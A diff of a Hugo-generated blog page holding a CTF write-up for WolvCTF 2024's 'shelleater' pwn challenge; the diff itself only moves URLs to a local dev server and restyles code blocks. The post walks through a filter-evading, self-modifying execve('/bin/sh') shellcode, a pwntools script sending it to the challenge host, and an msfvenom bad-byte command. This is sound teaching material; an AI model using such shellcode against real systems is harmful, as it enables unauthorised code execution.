@@ -1,26 +1,26 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><meta charset="utf-8">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="index, follow">
+<meta name="robots" content="noindex, nofollow">
 <title>WolvCTF 2024 - pwn/shelleater | CTF Writeups</title>
 <meta name="keywords" content="">
 <meta name="description" content="This was a fun challenge involving shellcode. I solved it the hard way by writing my own shellcode, but I saw two simpler ways to solve it after the CTF were over so I will briefly discuss those at the end.
 We are given a file and a netcat port. Taking a look at the file, all protections are off.
 checksec --file=shelleater [*] &#39;/home/df00/Desktop/shelleater&#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments Looking at the dissambly, the binary will exectute your shellcode, but not if it contains 0x80 or 0x050f.">
 <meta name="author" content="">
-<link rel="canonical" href="https://dfoudeh.github.io/posts/wolv-ctf-2024-shelleater/">
+<link rel="canonical" href="http://localhost:1313/posts/wolv-ctf-2024-shelleater/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
-<link rel="icon" href="https://dfoudeh.github.io/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="https://dfoudeh.github.io/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="https://dfoudeh.github.io/favicon-32x32.png">
-<link rel="apple-touch-icon" href="https://dfoudeh.github.io/apple-touch-icon.png">
-<link rel="mask-icon" href="https://dfoudeh.github.io/safari-pinned-tab.svg">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="https://dfoudeh.github.io/posts/wolv-ctf-2024-shelleater/">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/wolv-ctf-2024-shelleater/">
 <noscript>
     <style>
         #theme-toggle,
@@ -57,71 +57,7 @@ checksec --file=shelleater [*] &#39;/home/df00/Desktop/shelleater&#39; Arch: amd
         }
 
     </style>
-</noscript><meta property="og:title" content="WolvCTF 2024 - pwn/shelleater" />
-<meta property="og:description" content="This was a fun challenge involving shellcode. I solved it the hard way by writing my own shellcode, but I saw two simpler ways to solve it after the CTF were over so I will briefly discuss those at the end.
-We are given a file and a netcat port. Taking a look at the file, all protections are off.
-checksec --file=shelleater [*] &#39;/home/df00/Desktop/shelleater&#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments Looking at the dissambly, the binary will exectute your shellcode, but not if it contains 0x80 or 0x050f." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://dfoudeh.github.io/posts/wolv-ctf-2024-shelleater/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2024-03-18T15:34:02-04:00" />
-<meta property="article:modified_time" content="2024-03-18T15:34:02-04:00" />
-
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="WolvCTF 2024 - pwn/shelleater"/>
-<meta name="twitter:description" content="This was a fun challenge involving shellcode. I solved it the hard way by writing my own shellcode, but I saw two simpler ways to solve it after the CTF were over so I will briefly discuss those at the end.
-We are given a file and a netcat port. Taking a look at the file, all protections are off.
-checksec --file=shelleater [*] &#39;/home/df00/Desktop/shelleater&#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments Looking at the dissambly, the binary will exectute your shellcode, but not if it contains 0x80 or 0x050f."/>
-
-
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BreadcrumbList",
-  "itemListElement": [
-    {
-      "@type": "ListItem",
-      "position":  1 ,
-      "name": "Posts",
-      "item": "https://dfoudeh.github.io/posts/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  2 ,
-      "name": "WolvCTF 2024 - pwn/shelleater",
-      "item": "https://dfoudeh.github.io/posts/wolv-ctf-2024-shelleater/"
-    }
-  ]
-}
-</script>
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BlogPosting",
-  "headline": "WolvCTF 2024 - pwn/shelleater",
-  "name": "WolvCTF 2024 - pwn\/shelleater",
-  "description": "This was a fun challenge involving shellcode. I solved it the hard way by writing my own shellcode, but I saw two simpler ways to solve it after the CTF were over so I will briefly discuss those at the end.\nWe are given a file and a netcat port. Taking a look at the file, all protections are off.\nchecksec --file=shelleater [*] \u0026#39;/home/df00/Desktop/shelleater\u0026#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments Looking at the dissambly, the binary will exectute your shellcode, but not if it contains 0x80 or 0x050f.",
-  "keywords": [
-    
-  ],
-  "articleBody": "This was a fun challenge involving shellcode. I solved it the hard way by writing my own shellcode, but I saw two simpler ways to solve it after the CTF were over so I will briefly discuss those at the end.\nWe are given a file and a netcat port. Taking a look at the file, all protections are off.\nchecksec --file=shelleater [*] '/home/df00/Desktop/shelleater' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments Looking at the dissambly, the binary will exectute your shellcode, but not if it contains 0x80 or 0x050f.\nvoid entry(void) { long inc; ulong uVar1; ulong local_64 [12]; syscall(); syscall(); inc = 0; do { if ((*(ulong *)((long)local_64 + inc) \u0026 0xffff) == 0x50f) goto read_bytes.fail; inc = inc + 1; } while (inc != 0x60); inc = 0; while (uVar1 = *(ulong *)((long)local_64 + inc) \u0026 0xff, uVar1 != 0x80) { inc = inc + 1; if (inc == 0x62) { /* WARNING: Could not recover jumptable at 0x00401086. Too many branches */ /* WARNING: Treating indirect jump as call */ (*(code *)local_64)(0x62,uVar1,0x80); return; } } read_bytes.fail: syscall(); syscall(); /* WARNING: Bad instruction - Truncating control flow here */ halt_baddata(); } int 0x80 is used for syscalls, and 0x050f is the assembly for syscall. Let’s take a look at really simple shellcode:\n.global _start _start: .intel_syntax noprefix mov rax, 59 lea rdi, [rip+binsh] mov rsi, 0 mov rdx, 0 syscall binsh: .string \"/bin/sh\" We want to call execve(\"/bin/sh\", 0, 0). Looking at syscall table https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/, we need 59 in rax and “/bin/sh” in rdi. rsi and rdx are both zero. When we assemble this, we can that our syscal in assembly is 0x0f05 which we cannot use.\nobjdump -M intel -d shellcode-elf shellcode-elf: file format elf64-x86-64 Disassembly of section .text: 0000000000401000 \u003c_start\u003e: 401000:\t48 c7 c0 3b 00 00 00 mov rax,0x3b 401007:\t48 8d 3d 10 00 00 00 lea rdi,[rip+0x10] # 40101e 40100e:\t48 c7 c6 00 00 00 00 mov rsi,0x0 401015:\t48 c7 c2 00 00 00 00 mov rdx,0x0 40101c:\t0f 05 syscall 000000000040101e : 40101e:\t2f (bad) 40101f:\t62 (bad) 401020:\t69 .byte 0x69 401021:\t6e outs dx,BYTE PTR ds:[rsi] 401022:\t2f (bad) 401023:\t73 68 jae 40108d We can make the code modify itself before execution. We can do many different ways for example using add or sub, but I used xor.\n.global _start _start: .intel_syntax noprefix xor word ptr [rip+sys], 0x1111 mov rax, 59 lea rdi, [rip+binsh] mov rsi, 0 mov rdx, 0 sys: .byte 0x1e .byte 0x14 binsh: .string \"/bin/sh\" ~ At label sys, we write 2 bytes. If we had written 0x0f05, at runtime this would perform a syscall. Instead, what I did was xor 0x0f05 with 0x1111 which is 0x1e14. Then we write 0x1e14 at sys, and xor sys with 0x1111 at the start.\nThe final solve script:\nfrom pwn import * target = remote('shelleater.wolvctf.io', 1337) target.recv() payload = \"\\x66\\x81\\x35\\x1c\\x00\\x00\\x00\\x11\\x11\\x48\\xc7\\xc0\\x3b\\x00\\x00\\x00\\x48\\x8d\\x3d\\x10\\x00\\x00\\x00\\x48\\xc7\\xc6\\x00\\x00\\x00\\x00\\x48\\xc7\\xc2\\x00\\x00\\x00\\x00\\x1e\\x14\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\" target.sendline(payload) target.interactive() And we get our flag: wctf{1_s3ash3ll_1_3at_1t}\nOther solutions Other solutions I saw written about after the CTF that were much simpler:\nmsfvenom will generate shellcode for you, and you can specify which bytes to exclude: msfvenom -p linux/x64/exec -f c CMD=bash -b '\\x80\\x0f'\nNot sure if this is an intended way to solve this challenge, but the buffer for our shellcode is 100 bytes, and the check for 0x80 only checks the first 98 bytes. Looking online we can find lots of examples of shellcode that end in 0x80 and can pad the shellcode to the end of our buffer.\n",
-  "wordCount" : "600",
-  "inLanguage": "en",
-  "datePublished": "2024-03-18T15:34:02-04:00",
-  "dateModified": "2024-03-18T15:34:02-04:00",
-  "mainEntityOfPage": {
-    "@type": "WebPage",
-    "@id": "https://dfoudeh.github.io/posts/wolv-ctf-2024-shelleater/"
-  },
-  "publisher": {
-    "@type": "Organization",
-    "name": "CTF Writeups",
-    "logo": {
-      "@type": "ImageObject",
-      "url": "https://dfoudeh.github.io/favicon.ico"
-    }
-  }
-}
-</script>
+</noscript>
 </head>
 
 <body class="" id="top">
@@ -139,7 +75,7 @@ checksec --file=shelleater [*] &#39;/home/df00/Desktop/shelleater&#39; Arch: amd
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="https://dfoudeh.github.io/" accesskey="h" title="CTF Writeups (Alt + H)">CTF Writeups</a>
+            <a href="http://localhost:1313/" accesskey="h" title="CTF Writeups (Alt + H)">CTF Writeups</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -183,111 +119,111 @@ checksec --file=shelleater [*] &#39;/home/df00/Desktop/shelleater&#39; Arch: amd
   </header> 
   <div class="post-content"><p>This was a fun challenge involving shellcode. I solved it the hard way by writing my own shellcode, but I saw two simpler ways to solve it after the CTF were over so I will briefly discuss those at the end.</p>
 <p>We are given a file and a netcat port. Taking a look at the file, all protections are off.</p>
-<pre tabindex="0"><code>checksec --file=shelleater
-[*] &#39;/home/df00/Desktop/shelleater&#39;
-    Arch:     amd64-64-little
-    RELRO:    No RELRO
-    Stack:    No canary found
-    NX:       NX disabled
-    PIE:      No PIE (0x400000)
-    RWX:      Has RWX segments
-</code></pre><p>Looking at the dissambly, the binary will exectute your shellcode, but not if it contains 0x80 or 0x050f.</p>
-<pre tabindex="0"><code>void entry(void)
-
-{
-  long inc;
-  ulong uVar1;
-  ulong local_64 [12];
-  
-  syscall();
-  syscall();
-  inc = 0;
-  do {
-    if ((*(ulong *)((long)local_64 + inc) &amp; 0xffff) == 0x50f) goto read_bytes.fail;
-    inc = inc + 1;
-  } while (inc != 0x60);
-  inc = 0;
-  while (uVar1 = *(ulong *)((long)local_64 + inc) &amp; 0xff, uVar1 != 0x80) {
-    inc = inc + 1;
-    if (inc == 0x62) {
-                    /* WARNING: Could not recover jumptable at 0x00401086. Too many branches */
-                    /* WARNING: Treating indirect jump as call */
-      (*(code *)local_64)(0x62,uVar1,0x80);
-      return;
-    }
-  }
-read_bytes.fail:
-  syscall();
-  syscall();
-                    /* WARNING: Bad instruction - Truncating control flow here */
-  halt_baddata();
-}
-</code></pre><p><code>int 0x80</code> is used for syscalls, and 0x050f is the assembly for syscall. Let&rsquo;s take a look at really simple shellcode:</p>
-<pre tabindex="0"><code>.global _start
-_start:
-.intel_syntax noprefix
-
-        mov rax, 59
-        lea rdi, [rip+binsh]
-        mov rsi, 0
-        mov rdx, 0
-
-        syscall
-binsh:
-        .string &#34;/bin/sh&#34;
-</code></pre><p>We want to call <code>execve(&quot;/bin/sh&quot;, 0, 0)</code>. Looking at syscall table <code>https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</code>, we need 59 in rax and &ldquo;/bin/sh&rdquo; in rdi. rsi and rdx are both zero. When we assemble this, we can that our syscal in assembly is 0x0f05 which we cannot use.</p>
-<pre tabindex="0"><code>objdump -M intel -d shellcode-elf
-
-shellcode-elf:     file format elf64-x86-64
-
-
-Disassembly of section .text:
-
-0000000000401000 &lt;_start&gt;:
-  401000:	48 c7 c0 3b 00 00 00 	mov    rax,0x3b
-  401007:	48 8d 3d 10 00 00 00 	lea    rdi,[rip+0x10]        # 40101e &lt;binsh&gt;
-  40100e:	48 c7 c6 00 00 00 00 	mov    rsi,0x0
-  401015:	48 c7 c2 00 00 00 00 	mov    rdx,0x0
-  40101c:	0f 05                	syscall 
-
-000000000040101e &lt;binsh&gt;:
-  40101e:	2f                   	(bad)  
-  40101f:	62                   	(bad)  
-  401020:	69                   	.byte 0x69
-  401021:	6e                   	outs   dx,BYTE PTR ds:[rsi]
-  401022:	2f                   	(bad)  
-  401023:	73 68                	jae    40108d &lt;binsh+0x6f&gt;
-</code></pre><p>We can make the code modify itself before execution. We can do many different ways for example using add or sub, but I used xor.</p>
-<pre tabindex="0"><code>.global _start
-_start:
-.intel_syntax noprefix
-
-        xor word ptr [rip+sys], 0x1111
-        mov rax, 59
-        lea rdi, [rip+binsh]
-        mov rsi, 0
-        mov rdx, 0
-sys:
-        .byte 0x1e
-        .byte 0x14
-
-binsh:
-        .string &#34;/bin/sh&#34;
-~                         
-</code></pre><p>At label sys, we write 2 bytes. If we had written 0x0f05, at runtime this would perform a syscall. Instead, what I did was xor 0x0f05 with 0x1111 which is 0x1e14. Then we write 0x1e14 at sys, and xor sys with 0x1111 at the start.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>checksec --file<span style="color:#f92672">=</span>shelleater
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/df00/Desktop/shelleater&#39;</span>
+</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:    No RELRO
+</span></span><span style="display:flex;"><span>    Stack:    No canary found
+</span></span><span style="display:flex;"><span>    NX:       NX disabled
+</span></span><span style="display:flex;"><span>    PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    RWX:      Has RWX segments
+</span></span></code></pre></div><p>Looking at the dissambly, the binary will exectute your shellcode, but not if it contains 0x80 or 0x050f.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">entry</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> inc;
+</span></span><span style="display:flex;"><span>  ulong uVar1;
+</span></span><span style="display:flex;"><span>  ulong local_64 [<span style="color:#ae81ff">12</span>];
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">syscall</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">syscall</span>();
+</span></span><span style="display:flex;"><span>  inc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((<span style="color:#f92672">*</span>(ulong <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)local_64 <span style="color:#f92672">+</span> inc) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x50f</span>) <span style="color:#66d9ef">goto</span> read_bytes.fail;
+</span></span><span style="display:flex;"><span>    inc <span style="color:#f92672">=</span> inc <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> (inc <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x60</span>);
+</span></span><span style="display:flex;"><span>  inc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (uVar1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(ulong <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)local_64 <span style="color:#f92672">+</span> inc) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>, uVar1 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x80</span>) {
+</span></span><span style="display:flex;"><span>    inc <span style="color:#f92672">=</span> inc <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (inc <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x62</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Could not recover jumptable at 0x00401086. Too many branches */</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Treating indirect jump as call */</span>
+</span></span><span style="display:flex;"><span>      (<span style="color:#f92672">*</span>(code <span style="color:#f92672">*</span>)local_64)(<span style="color:#ae81ff">0x62</span>,uVar1,<span style="color:#ae81ff">0x80</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>read_bytes.fail:
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">syscall</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">syscall</span>();
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Bad instruction - Truncating control flow here */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">halt_baddata</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>int 0x80</code> is used for syscalls, and 0x050f is the assembly for syscall. Let&rsquo;s take a look at really simple shellcode:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>.global _start
+</span></span><span style="display:flex;"><span>_start:
+</span></span><span style="display:flex;"><span>.intel_syntax noprefix
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        mov rax, <span style="color:#ae81ff">59</span>
+</span></span><span style="display:flex;"><span>        lea rdi, <span style="color:#f92672">[</span>rip+binsh<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>        mov rsi, <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        mov rdx, <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        syscall
+</span></span><span style="display:flex;"><span>binsh:
+</span></span><span style="display:flex;"><span>        .string <span style="color:#e6db74">&#34;/bin/sh&#34;</span>
+</span></span></code></pre></div><p>We want to call <code>execve(&quot;/bin/sh&quot;, 0, 0)</code>. Looking at syscall table <code>https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</code>, we need 59 in rax and &ldquo;/bin/sh&rdquo; in rdi. rsi and rdx are both zero. When we assemble this, we can that our syscal in assembly is 0x0f05 which we cannot use.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>objdump -M intel -d shellcode-elf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shellcode-elf:     file format elf64-x86-64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Disassembly of section .text:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000000401000</span> &lt;_start&gt;:
+</span></span><span style="display:flex;"><span>  401000:	<span style="color:#ae81ff">48</span> c7 c0 3b <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> 	mov    rax,0x3b
+</span></span><span style="display:flex;"><span>  401007:	<span style="color:#ae81ff">48</span> 8d 3d <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> 	lea    rdi,<span style="color:#f92672">[</span>rip+0x10<span style="color:#f92672">]</span>        <span style="color:#75715e"># 40101e &lt;binsh&gt;</span>
+</span></span><span style="display:flex;"><span>  40100e:	<span style="color:#ae81ff">48</span> c7 c6 <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> 	mov    rsi,0x0
+</span></span><span style="display:flex;"><span>  401015:	<span style="color:#ae81ff">48</span> c7 c2 <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> 	mov    rdx,0x0
+</span></span><span style="display:flex;"><span>  40101c:	0f <span style="color:#ae81ff">05</span>                	syscall 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>000000000040101e &lt;binsh&gt;:
+</span></span><span style="display:flex;"><span>  40101e:	2f                   	<span style="color:#f92672">(</span>bad<span style="color:#f92672">)</span>  
+</span></span><span style="display:flex;"><span>  40101f:	<span style="color:#ae81ff">62</span>                   	<span style="color:#f92672">(</span>bad<span style="color:#f92672">)</span>  
+</span></span><span style="display:flex;"><span>  401020:	<span style="color:#ae81ff">69</span>                   	.byte 0x69
+</span></span><span style="display:flex;"><span>  401021:	6e                   	outs   dx,BYTE PTR ds:<span style="color:#f92672">[</span>rsi<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>  401022:	2f                   	<span style="color:#f92672">(</span>bad<span style="color:#f92672">)</span>  
+</span></span><span style="display:flex;"><span>  401023:	<span style="color:#ae81ff">73</span> <span style="color:#ae81ff">68</span>                	jae    40108d &lt;binsh+0x6f&gt;
+</span></span></code></pre></div><p>We can make the code modify itself before execution. We can do many different ways for example using add or sub, but I used xor.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>.global _start
+</span></span><span style="display:flex;"><span>_start:
+</span></span><span style="display:flex;"><span>.intel_syntax noprefix
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        xor word ptr <span style="color:#f92672">[</span>rip+sys<span style="color:#f92672">]</span>, 0x1111
+</span></span><span style="display:flex;"><span>        mov rax, <span style="color:#ae81ff">59</span>
+</span></span><span style="display:flex;"><span>        lea rdi, <span style="color:#f92672">[</span>rip+binsh<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>        mov rsi, <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        mov rdx, <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>sys:
+</span></span><span style="display:flex;"><span>        .byte 0x1e
+</span></span><span style="display:flex;"><span>        .byte 0x14
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>binsh:
+</span></span><span style="display:flex;"><span>        .string <span style="color:#e6db74">&#34;/bin/sh&#34;</span>
+</span></span><span style="display:flex;"><span>~                         
+</span></span></code></pre></div><p>At label sys, we write 2 bytes. If we had written 0x0f05, at runtime this would perform a syscall. Instead, what I did was xor 0x0f05 with 0x1111 which is 0x1e14. Then we write 0x1e14 at sys, and xor sys with 0x1111 at the start.</p>
 <p>The final solve script:</p>
-<pre tabindex="0"><code>from pwn import *
-
-target = remote(&#39;shelleater.wolvctf.io&#39;, 1337)
-
-target.recv()
-
-payload = &#34;\x66\x81\x35\x1c\x00\x00\x00\x11\x11\x48\xc7\xc0\x3b\x00\x00\x00\x48\x8d\x3d\x10\x00\x00\x00\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x1e\x14\x2f\x62\x69\x6e\x2f\x73\x68\x00&#34;
-
-target.sendline(payload)
-
-target.interactive()
-</code></pre><p>And we get our flag:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;shelleater.wolvctf.io&#39;</span>, <span style="color:#ae81ff">1337</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x66\x81\x35\x1c\x00\x00\x00\x11\x11\x48\xc7\xc0\x3b\x00\x00\x00\x48\x8d\x3d\x10\x00\x00\x00\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x1e\x14\x2f\x62\x69\x6e\x2f\x73\x68\x00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>And we get our flag:
 <code>wctf{1_s3ash3ll_1_3at_1t}</code></p>
 <h3 id="other-solutions">Other solutions<a hidden class="anchor" aria-hidden="true" href="#other-solutions">#</a></h3>
 <p>Other solutions I saw written about after the CTF that were much simpler:</p>
@@ -312,7 +248,7 @@ target.interactive()
     </main>
     
 <footer class="footer">
-    <span>&copy; 2024 <a href="https://dfoudeh.github.io/">CTF Writeups</a></span>
+    <span>&copy; 2024 <a href="http://localhost:1313/">CTF Writeups</a></span>
     <span>
         Powered by
         <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
